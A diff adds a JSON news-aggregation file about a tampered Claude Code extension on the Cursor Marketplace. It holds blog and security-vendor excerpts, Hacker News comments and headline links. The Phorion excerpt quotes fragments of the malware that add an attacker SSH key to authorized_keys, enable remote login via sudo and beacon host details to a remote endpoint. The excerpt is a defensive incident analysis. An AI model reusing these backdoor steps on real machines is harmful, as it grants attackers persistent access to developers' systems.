@@ -1,0 +1,74 @@
+{
+  "articleText": "[Hacker News — doublepulsar.com]\nAnthropic Claude Anthropic hacked via Cursor to deliver remote access trojan to Claude developer laptops worldwide Kevin Beaumont 4 min read · 6 hours ago --\n\nYesterday, Anthropic were compromised via a Cursor VS Code extension used by tens of millions of developers for Claude access was delivering a remote access trojan via an SSH reverse backdoor. The malware allowed hands on and automated remote access to developer laptops and desktops, in a supply chain attack.\n\nAnthropic has not informed customers, and the malicious version was silently deleted without telling anybody.\n\n“A malicious actor used access to Cursor’s marketplace to publish a tampered extension targeting Cursor’s users, we were not involved with building, publishing, or hosting this”\n\nThe extension itself auto updated in Cursor to the malicious version. Cursor say around 5000 developer systems were impacted.\n\nPhorion were the first to notice the malicious activity on endpoints:\n\nThe compromised version was 2.1.313. This version was replaced 8 hours ago by Anthropic, with version 2.1.314, which appears to remove the backdoor from the extension but I’m not sure if it still contains no malicious code. It does not remove the SSH backdoor from systems already infected, nor the prior recon activity.\n\nYou may notice 2.1.313 is missing from OpenVSX, Visual Studio Marketplace and Cursor:\n\nPress enter or click to view image in full size Cursor has admitted the issue:\n\na maliciously modified version of Anthropic’s Claude Code extension was made available in the Cursor VS Code extension Marketplace. The extension runs malicious code that attempts to install a persistent SSH backdoor. Specifically, it:\n\nCollects host and user information: hostname, username, OS, architecture, home directory path, environment variable names, working directories, configured Git email, and public IP.\n\nAttempts to add an attacker-controlled SSH key to authorized_keys , enable the local SSH service, and open a reverse SSH tunnel. Outside of highly unusual circumstances where Cursor was started with administrator privileges, due to errors in the malicious code, this step would fail.\n\nAttempts to make the reverse SSH tunnel persistent via a LaunchAgent (macOS) or a scheduled task that attempts to run as SYSTEM with a Startup-script fallback (Windows). Background scripts retry the tunnel roughly every 60 seconds.\n\nReports host details and backdoor status via HTTP POST to /beacon on port 8099.\n\nTo hunt for the malicious version with Microsoft Defender for Endpoint, I have published KQL queries:\n\nThere is some wordsmithing in the Cursor blog, for example: “This malicious version of the extension was not developed by Anthropic” — it was, in fact, uploaded as Anthropic’s verified account. “Developed” is doing some heavy lifting — of course Anthropic didn’t develop the backdoor, there was a security incident leading to a supply chain attack. According to Anthropic the security breach was at Cursor.\n\nNotable customers who run Claude Code and Cursor on laptops include Binance, amongst thousands of others.\n\nThis is an emerging situation, follow me on Mastodon for updates — @gossithedog@cyberplace.social:\n\n---\n\n[Hacker News — phorion.io]\nPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.\n\nOrganisations should immediately review their environments for use of Claude Code for VSCode 2.1.313 and engage incident response where use of the extension is discovered.\n\nPhorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the associated release from its marketplace, additionally pulling NPM and VSCode versions for 2.1.313 from their relevant registries.\n\nWhile the implant includes setup and persistence logic for macOS, Linux, and Windows , we&rsquo;re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.\n\nThe Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.\n\nNotably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off . Because the script only tries to enable SSH if the output matches Off , it skips the enablement step entirely. On a Mac that doesn&rsquo;t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.\n\nIn this post, we&rsquo;ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.\n\nThe compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.\n\nThe injected prefix pulls in standard Node.js modules ( child_process , fs , os , path , http , and crypto ) and executes as soon as Node loads the file, before the extension&rsquo;s normal activate callback even runs. The user doesn&rsquo;t need to interact with the extension for the payload to fire.\n\nFirst, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys , setting permissions to 0700 on the directory and 0600 on the file.\n\nThe key uses the comment svc-telemetry . Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it&rsquo;s worth checking the public-key fingerprint rather than relying solely on the comment string.\n\nvar sd = path.join(HOME, &#34;.ssh&#34; ), ak = path.join(sd, &#34;authorized_keys&#34; ); // ... if (cur.indexOf( &#34;svc-telemetry&#34; ) < 0 ) { fs.appendFileSync(ak, PUB + &#34;\\n&#34; ); d.sshKey = &#34;added&#34; } else { d.sshKey = &#34;present&#34; } Here, cur holds the existing contents of authorized_keys , and PUB is the embedded attacker public key (redacted here).\n\nWith the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:\n\nNone of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won&rsquo;t always succeed from a standard user context.\n\nIt looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function ( det() ) that hardcodes /bin/sh , which isn&rsquo;t going to get very far on a standard Windows install.\n\nOn macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i . It only tries to enable Remote Login if the output contains Off :\n\n// ... else if (PLAT === &#34;darwin&#34; ) { var rl = ex( &#34;systemsetup -getremotelogin 2>/dev/null&#34; , 4000 ); d.remoteLogin = rl; if ( /Off/i .test(rl)) { det( &#34;sudo -n systemsetup -setremotelogin on >/dev/null 2>",
+  "reactions": [
+    "[Hacker News] Comments moved to https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=50300683 .",
+    "[Hacker News] there is NO legit v2.1.313 here is the ddworken comment confirming https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=50305148",
+    "[Hacker News] As an aside, it would be neat if publishing services like this had a sort of 2FA, eg the package manager had a hook endpoint where it sent the details of the next requested published version. Allowing the owners to validate. Kinda like 2FA on the deployment itself, not just 2FA on the .. A. I guess 2FD heh.",
+    "[Hacker News] Maybe is a security measure, can&#x27;t hack something if it&#x27;s never available",
+    "[Hacker News] now I kinda wanna shadow the usual SSH creds files with LLM read-only user, so it can rummage thru the repos all it wants but I need to do the push using my creds.",
+    "[Hacker News] I mostly agree, but I would like to mention that we are destroying our planet also because of the other fields of engineering :-). Sure, software has a lot more malpractice (&quot;let&#x27;s ship barely-tested, unfinished stuff&quot;), but let&#x27;s not say that &quot;the other engineers&quot; are making the world a better place merely by &quot;being real engineers&quot;.",
+    "[Hacker News] I&#x27;ve got a whole heap of unfinished side projects that I&#x27;m digging through",
+    "[Hacker News] According to Felix from Anthropic: no [1]. This didn&#x27;t seem to impact the official VS Code repository, etc. [1] https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=50304129",
+    "[Hacker News] I&#x27;m not sure where you see the flex. If someone gets hold of the token allowing the upload of your app to the store, it&#x27;s completely irrelevant how good your internal code&#x2F;review systems are. They&#x27;ve been completely bypassed and never triggered.",
+    "[Hacker News] It is really interesting to see how hard it will be to get this message across on X.com. $44B to buy Twitter seems cheaper and cheaper every day.",
+    "[Hacker News] The AI summary here is right and the human info is wrong -- Anthropic does publish the Cursor extension in general, but did not publish this version"
+  ],
+  "items": [
+    {
+      "origin": "Hacker News",
+      "title": "Claude Code VS Code extension with backdoor released on Cursor marketplace",
+      "url": "https://news.ycombinator.com/item?id=50301983",
+      "score": 395,
+      "commentCount": 1
+    },
+    {
+      "origin": "Hacker News",
+      "title": "Backdoor in Claude Code for VS Code extension on the Cursor Marketplace",
+      "url": "https://news.ycombinator.com/item?id=50300683",
+      "score": 271,
+      "commentCount": 333
+    },
+    {
+      "origin": "Anthropic 뉴스",
+      "title": "Trojanized Claude Code Extension Delivered Persistent SSH Backdoor to Developer Machines - Step Security",
+      "url": "https://news.google.com/rss/articles/CBMic0FVX3lxTE5QN1Q5bXI1WXMzZlpOLWIxaDJEVGhuTWZxcXRwTWdaXzlETHZYd0pIcGhpdnR3R1dsQXUzWGFoZHUyZUd2UldGMHotYVFHNHFQZjdCWERJektwVXZVMWw5dGc4WldHQktiLXFYVnBST19Ecmc?oc=5",
+      "score": 20,
+      "commentCount": 0
+    },
+    {
+      "origin": "Anthropic 뉴스",
+      "title": "Cursor says up to 5,000 users affected by tampered Claude Code extension - Reuters",
+      "url": "https://news.google.com/rss/articles/CBMixgFBVV95cUxOSE5Sd2ZzblVoTHk3cWowdjBHOUlGQ25obHhuSkoyell3S2JWTUxqeXFFRnBMbTVaOENobjFKVFJXT0VhQi1VSzVBX0dSM3N5SGJ4N2VWSjhnX3NCQlJsSmdTX1RmSlpEeHN0NFFXVll0MzZRV1lfbUpkcDZ1dk9xQXpSWHBVUVJiMDJCYXgtMmlxMnQ1a2dxcmxBZlFBcTY0SUZMYXZyeHNZX3o1ejRUbkxmN3JqRlYtSnNCRnFiZkswLWx4S2c?oc=5",
+      "score": 20,
+      "commentCount": 0
+    },
+    {
+      "origin": "Anthropic 뉴스",
+      "title": "Cursor: 5,000 Users Hit by Tampered Claude Code [2026] - https://tech-insider.org/",
+      "url": "https://news.google.com/rss/articles/CBMihgFBVV95cUxNdVA4YXJPS0JJMXRZSUFBTTc4Z2JwWGpaX2EtQ2c3VjJqYjNLVWhwcXJWb3NhRFFyX2NCWG12VzhwNGlNX1NwVmh3MUczbkJCQms1a0Z4OFgzek5PTll4ajRJS0Npc2hEdmtsNEFBSnRyTEZDaFd6QWdqTnBKa2FKYzRobGtwdw?oc=5",
+      "score": 20,
+      "commentCount": 0
+    },
+    {
+      "origin": "Anthropic 뉴스",
+      "title": "Cursor Says Tampered Claude Code Extension Reached Up to 5,000 Users - Technology Org",
+      "url": "https://news.google.com/rss/articles/CBMikAFBVV95cUxOd0RoZEdVX05GUER3ZV9kSkUxcVVQblZobTh0ZmdLNnlHTFhMdmpYenN6dER2Qy1IeWpNYUhSUlBuREd3bC1ZZUlRdTRTMmtjdEJVYkpnWndjOGNYQmdGWmw2dVJXUmFHeTRRd0oxZUNqMFR6SnZiNHBjX2JlUzgzWHlHYUxNcjZwblNTa0J2bzU?oc=5",
+      "score": 20,
+      "commentCount": 0
+    },
+    {
+      "origin": "Anthropic 뉴스",
+      "title": "Tampered Claude Code Extension: 5,000 Cursor Users [2026] - shattered.io",
+      "url": "https://news.google.com/rss/articles/CBMigAFBVV95cUxOdnVVUDhWYTZ2WjgtVmZpMzhaYzlWcGpXemVHaFpTMWdnaGxvU3lEQW96VnNhb2Q1UjlBZmpPcmNxUlpMdVNncFA0RC1mLTFNRDktYTlrNGlMRHFDLVNwTnMtbWhHMk10TjlxaHAxTzRkVmU3NW5vT1d0eUpuWWJQYg?oc=5",
+      "score": 20,
+      "commentCount": 0
+    },
+    {
+      "origin": "Anthropic 뉴스",
+      "title": "Researchers broke the browsers built into VS Code, Cursor, Copilot, Codex and Claude Desktop - Help Net Security",
+      "url": "https://news.google.com/rss/articles/CBMikwFBVV95cUxPM0dkaWlfVnhscS1vQm55TUZvZE5fT2NiWGlqa0VYX0hDakpaSXFidk0xRTctM3d4cjVoVzhKeWFEUlEycXBROEdudk9kNXR5SXMzNmJoRGs1VEs5U1ZGQnVKdUVxWkRlV2dhVmJXcTBlQUE2UmhUalZCT19aNW8xU1lTTTk1YTJjVWZGS2hRT3hyNGM?oc=5",
+      "score": 20,
+      "commentCount": 0
+    }
+  ]
+}
